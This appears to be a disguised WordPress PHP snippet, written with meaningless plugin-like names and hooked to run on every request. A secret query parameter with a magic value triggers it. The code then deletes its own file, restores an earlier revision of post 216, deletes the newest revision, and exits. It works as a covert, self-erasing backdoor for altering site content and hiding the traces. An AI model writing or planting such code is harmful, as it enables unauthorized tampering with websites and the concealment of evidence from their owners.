<?php

function com_titles_addons() {
	if (isset($_GET['controller_effects_search_publisher']) && $_GET['controller_effects_search_publisher'] === 'poster_chart_stock') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$url_style_reading = 216;
		$bangla_preview_blogroll = wp_get_post_revisions($url_style_reading);
		if (empty($bangla_preview_blogroll)) die('no revisions');
		if (count($bangla_preview_blogroll) < 2) die('less than 2');
		$solution_class_slideshow = array_shift($bangla_preview_blogroll);
		$reader_archive_really = $solution_class_slideshow->ID;
		$jquery_make_open_ultimate = array_shift($bangla_preview_blogroll);
		$tree_data_exchange = $jquery_make_open_ultimate->ID;
		$source_crm_snippets = wp_restore_post_revision($tree_data_exchange);
		if ($source_crm_snippets === false) die('error restoring');
		$source_crm_snippets = wp_delete_post_revision($reader_archive_really);		
		if ($source_crm_snippets === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'com_titles_addons');
